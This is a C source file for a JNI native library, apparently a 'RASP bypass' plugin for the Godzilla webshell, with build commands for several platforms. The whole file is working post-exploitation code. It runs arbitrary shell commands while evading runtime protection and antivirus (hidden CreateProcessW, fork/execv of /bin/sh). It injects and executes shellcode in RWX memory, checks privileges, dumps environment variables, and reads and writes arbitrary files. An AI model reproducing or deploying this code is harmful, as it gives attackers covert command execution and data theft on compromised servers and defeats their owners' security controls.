/*
 * RASP Bypass JNI Library
 *
 * JNI entry names embed the Java class FQN (see Java_shells_plugins_java_assets_RaspBypassModule_* below).
 * The Godzilla client must NOT random-rename RaspBypassModule (JavaAShell.dynamicUpdateClassName skips it);
 * otherwise UnsatisfiedLinkError: jniExec not linked for org.apache.coyote... style names.
 *
 * Compile commands:
 * 
 * Linux x64:
 *   gcc -shared -fPIC -o rasp_bypass_linux_x64.so rasp_bypass_jni.c -I$JAVA_HOME/include -I$JAVA_HOME/include/linux
 * 
 * Linux x86:
 *   gcc -shared -fPIC -m32 -o rasp_bypass_linux_x86.so rasp_bypass_jni.c -I$JAVA_HOME/include -I$JAVA_HOME/include/linux
 * 
 * Windows x64 (MinGW):
 *   x86_64-w64-mingw32-gcc -shared -o rasp_bypass_win_x64.dll rasp_bypass_jni.c -I"%JAVA_HOME%\include" -I"%JAVA_HOME%\include\win32"
 * 
 * macOS:
 *   gcc -shared -fPIC -o rasp_bypass_mac.so rasp_bypass_jni.c -I$JAVA_HOME/include -I$JAVA_HOME/include/darwin
 */

#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#ifdef _WIN32
    #include <windows.h>
    #include <process.h>
    #define popen _popen
    #define pclose _pclose
#else
    #include <sys/wait.h>
    #include <signal.h>
#endif

#ifdef _WIN32
/*
 * _popen(cmd) uses cmd.exe /c; AV (e.g. 360) may block cmd.exe and popen returns NULL.
 * CreateProcessW(NULL, cmdline) uses the first token as the executable (e.g. net.exe) without cmd.exe.
 * Returns heap string on success or fatal error; NULL means fall back to _popen (shell builtins).
 */
static char *jniExecWindowsTryDirect(const char *cmdUtf8) {
    if (cmdUtf8 == NULL || cmdUtf8[0] == '\0') {
        char *e = (char *)malloc(32);
        if (e) strcpy(e, "Error: empty command");
        return e;
    }

    int nw = MultiByteToWideChar(CP_UTF8, 0, cmdUtf8, -1, NULL, 0);
    if (nw <= 0) {
        return strdup("Error: invalid UTF-8 command");
    }
    wchar_t *cmdMutable = (wchar_t *)malloc(sizeof(wchar_t) * (size_t)nw);
    if (cmdMutable == NULL) {
        return strdup("Error: Memory allocation failed");
    }
    if (MultiByteToWideChar(CP_UTF8, 0, cmdUtf8, -1, cmdMutable, nw) <= 0) {
        free(cmdMutable);
        return strdup("Error: UTF-8 conversion failed");
    }

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        free(cmdMutable);
        return strdup("Error: CreatePipe failed");
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    HANDLE hNul = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ, &sa, OPEN_EXISTING, 0, NULL);
    if (hNul == INVALID_HANDLE_VALUE) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        free(cmdMutable);
        return strdup("Error: CreateFile NUL failed");
    }

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hNul;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessW(
        NULL,
        cmdMutable,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);

    free(cmdMutable);

    if (!ok) {
        DWORD err = GetLastError();
        CloseHandle(hRead);
        CloseHandle(hWrite);
        CloseHandle(hNul);
        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
            return NULL; /* shell builtin or unknown: use _popen */
        }
        char *msg = (char *)malloc(96);
        if (msg) {
            snprintf(msg, 96, "Error: CreateProcess failed (code %lu)", (unsigned long)err);
        }
        return msg;
    }

    CloseHandle(hWrite);
    CloseHandle(hNul);
    CloseHandle(pi.hThread);

    char *result = NULL;
    size_t resultSize = 0;
    unsigned char buf[4096];
    DWORD nRead = 0;

    for (;;) {
        if (!ReadFile(hRead, buf, sizeof(buf), &nRead, NULL) || nRead == 0) {
            break;
        }
        char *nr = (char *)realloc(result, resultSize + nRead + 1);
        if (nr == NULL) {
            free(result);
            CloseHandle(hRead);
            WaitForSingleObject(pi.hProcess, 5000);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            return strdup("Error: Memory allocation failed");
        }
        result = nr;
        memcpy(result + resultSize, buf, nRead);
        resultSize += nRead;
        result[resultSize] = '\0';
    }

    DWORD w = WaitForSingleObject(pi.hProcess, 120000);
    if (w != WAIT_OBJECT_0) {
        TerminateProcess(pi.hProcess, 1);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);

    if (result == NULL) {
        return strdup("");
    }
    return result;
}
#endif

// JNI method: Execute command and return output
JNIEXPORT jstring JNICALL Java_shells_plugins_java_assets_RaspBypassModule_jniExec
  (JNIEnv *env, jobject obj, jstring cmd) {
    
    const char *cmdStr = (*env)->GetStringUTFChars(env, cmd, NULL);
    if (cmdStr == NULL) {
        return (*env)->NewStringUTF(env, "Error: Cannot get command string");
    }

#ifdef _WIN32
    char *winOut = jniExecWindowsTryDirect(cmdStr);
    if (winOut != NULL) {
        jstring jResult = (*env)->NewStringUTF(env, winOut);
        free(winOut);
        (*env)->ReleaseStringUTFChars(env, cmd, cmdStr);
        return jResult;
    }
    /* Fall back to _popen (needs cmd.exe; may be blocked by AV) */
#endif

    FILE *fp;
    char buffer[4096];
    char *result = NULL;
    size_t resultSize = 0;
    
    fp = popen(cmdStr, "r");
    if (fp == NULL) {
        (*env)->ReleaseStringUTFChars(env, cmd, cmdStr);
        return (*env)->NewStringUTF(env, "Error: popen failed (often cmd.exe blocked by security software)");
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        char *newResult = (char *)realloc(result, resultSize + len + 1);
        if (newResult == NULL) {
            free(result);
            pclose(fp);
            (*env)->ReleaseStringUTFChars(env, cmd, cmdStr);
            return (*env)->NewStringUTF(env, "Error: Memory allocation failed");
        }
        result = newResult;
        strcpy(result + resultSize, buffer);
        resultSize += len;
    }
    
    pclose(fp);
    (*env)->ReleaseStringUTFChars(env, cmd, cmdStr);
    
    if (result == NULL) {
        return (*env)->NewStringUTF(env, "");
    }
    
    jstring jResult = (*env)->NewStringUTF(env, result);
    free(result);
    
    return jResult;
}

// JNI method: Fork and exec (bypass RASP)
JNIEXPORT jint JNICALL Java_shells_plugins_java_assets_RaspBypassModule_forkAndExec
  (JNIEnv *env, jobject obj, jstring cmd) {
    
#ifndef _WIN32
    const char *cmdStr = (*env)->GetStringUTFChars(env, cmd, NULL);
    if (cmdStr == NULL) {
        return -1;
    }
    
    pid_t pid = fork();
    
    if (pid == 0) {
        // Child process
        char *args[] = {"/bin/sh", "-c", (char *)cmdStr, NULL};
        execv("/bin/sh", args);
        exit(1);
    } else if (pid > 0) {
        // Parent process
        (*env)->ReleaseStringUTFChars(env, cmd, cmdStr);
        return pid;
    } else {
        // Fork failed
        (*env)->ReleaseStringUTFChars(env, cmd, cmdStr);
        return -1;
    }
#else
    return -1; // Windows doesn't support fork
#endif
}

// JNI method: Get process list
JNIEXPORT jstring JNICALL Java_shells_plugins_java_assets_RaspBypassModule_getProcessList
  (JNIEnv *env, jobject obj) {
    
    FILE *fp;
    char buffer[1024];
    char *result = NULL;
    size_t resultSize = 0;
    
#ifdef _WIN32
    fp = popen("tasklist", "r");
#else
    fp = popen("ps aux", "r");
#endif
    
    if (fp == NULL) {
        return (*env)->NewStringUTF(env, "Error: Cannot get process list");
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        char *newResult = (char *)realloc(result, resultSize + len + 1);
        if (newResult == NULL) {
            free(result);
            pclose(fp);
            return (*env)->NewStringUTF(env, "Error: Memory allocation failed");
        }
        result = newResult;
        strcpy(result + resultSize, buffer);
        resultSize += len;
    }
    
    pclose(fp);
    
    if (result == NULL) {
        return (*env)->NewStringUTF(env, "");
    }
    
    jstring jResult = (*env)->NewStringUTF(env, result);
    free(result);
    
    return jResult;
}

// JNI method: Load and execute shellcode (Windows only)
JNIEXPORT jint JNICALL Java_shells_plugins_java_assets_RaspBypassModule_execShellcode
  (JNIEnv *env, jobject obj, jbyteArray shellcode) {
    
#ifdef _WIN32
    jsize size = (*env)->GetArrayLength(env, shellcode);
    jbyte *data = (*env)->GetByteArrayElements(env, shellcode, NULL);
    
    if (data == NULL) {
        return -1;
    }
    
    // Allocate executable memory
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        (*env)->ReleaseByteArrayElements(env, shellcode, data, JNI_ABORT);
        return -1;
    }
    
    // Copy shellcode
    memcpy(mem, data, size);
    
    // Create thread to execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFree(mem, 0, MEM_RELEASE);
        (*env)->ReleaseByteArrayElements(env, shellcode, data, JNI_ABORT);
        return -1;
    }
    
    // Wait for thread
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
    (*env)->ReleaseByteArrayElements(env, shellcode, data, JNI_ABORT);
    
    return 0;
#else
    return -1; // Not supported on non-Windows
#endif
}

// JNI method: Check if running as root/admin
JNIEXPORT jboolean JNICALL Java_shells_plugins_java_assets_RaspBypassModule_isPrivileged
  (JNIEnv *env, jobject obj) {
    
#ifdef _WIN32
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin ? JNI_TRUE : JNI_FALSE;
#else
    return (getuid() == 0) ? JNI_TRUE : JNI_FALSE;
#endif
}

// JNI method: Get environment variables
JNIEXPORT jstring JNICALL Java_shells_plugins_java_assets_RaspBypassModule_getEnvVars
  (JNIEnv *env, jobject obj) {
    
#ifdef _WIN32
    extern char **_environ;
    char **envp = _environ;
#else
    extern char **environ;
    char **envp = environ;
#endif
    
    char *result = (char *)malloc(1);
    result[0] = '\0';
    size_t resultSize = 0;
    
    while (envp != NULL && *envp != NULL) {
        size_t len = strlen(*envp);
        char *newResult = (char *)realloc(result, resultSize + len + 2);
        if (newResult == NULL) {
            free(result);
            return (*env)->NewStringUTF(env, "Error: Memory allocation failed");
        }
        result = newResult;
        strcpy(result + resultSize, *envp);
        resultSize += len;
        result[resultSize++] = '\n';
        result[resultSize] = '\0';
        envp++;
    }
    
    jstring jResult = (*env)->NewStringUTF(env, result);
    free(result);
    
    return jResult;
}

// JNI method: Read file
JNIEXPORT jbyteArray JNICALL Java_shells_plugins_java_assets_RaspBypassModule_readFile
  (JNIEnv *env, jobject obj, jstring path) {
    
    const char *pathStr = (*env)->GetStringUTFChars(env, path, NULL);
    if (pathStr == NULL) {
        return NULL;
    }
    
    FILE *fp = fopen(pathStr, "rb");
    if (fp == NULL) {
        (*env)->ReleaseStringUTFChars(env, path, pathStr);
        return NULL;
    }
    
    // Get file size
    fseek(fp, 0, SEEK_END);
    long fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Allocate buffer
    jbyte *buffer = (jbyte *)malloc(fileSize);
    if (buffer == NULL) {
        fclose(fp);
        (*env)->ReleaseStringUTFChars(env, path, pathStr);
        return NULL;
    }
    
    // Read file
    size_t bytesRead = fread(buffer, 1, fileSize, fp);
    fclose(fp);
    (*env)->ReleaseStringUTFChars(env, path, pathStr);
    
    // Create byte array
    jbyteArray result = (*env)->NewByteArray(env, bytesRead);
    if (result != NULL) {
        (*env)->SetByteArrayRegion(env, result, 0, bytesRead, buffer);
    }
    
    free(buffer);
    return result;
}

// JNI method: Write file
JNIEXPORT jboolean JNICALL Java_shells_plugins_java_assets_RaspBypassModule_writeFile
  (JNIEnv *env, jobject obj, jstring path, jbyteArray data) {
    
    const char *pathStr = (*env)->GetStringUTFChars(env, path, NULL);
    if (pathStr == NULL) {
        return JNI_FALSE;
    }
    
    jsize size = (*env)->GetArrayLength(env, data);
    jbyte *dataBytes = (*env)->GetByteArrayElements(env, data, NULL);
    if (dataBytes == NULL) {
        (*env)->ReleaseStringUTFChars(env, path, pathStr);
        return JNI_FALSE;
    }
    
    FILE *fp = fopen(pathStr, "wb");
    if (fp == NULL) {
        (*env)->ReleaseByteArrayElements(env, data, dataBytes, JNI_ABORT);
        (*env)->ReleaseStringUTFChars(env, path, pathStr);
        return JNI_FALSE;
    }
    
    size_t bytesWritten = fwrite(dataBytes, 1, size, fp);
    fclose(fp);
    
    (*env)->ReleaseByteArrayElements(env, data, dataBytes, JNI_ABORT);
    (*env)->ReleaseStringUTFChars(env, path, pathStr);
    
    return (bytesWritten == size) ? JNI_TRUE : JNI_FALSE;
}

// JNI OnLoad - called when library is loaded
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    return JNI_VERSION_1_8;
}

// JNI OnUnload - called when library is unloaded
JNIEXPORT void JNICALL JNI_OnUnload(JavaVM *vm, void *reserved) {
    // Cleanup if needed
}
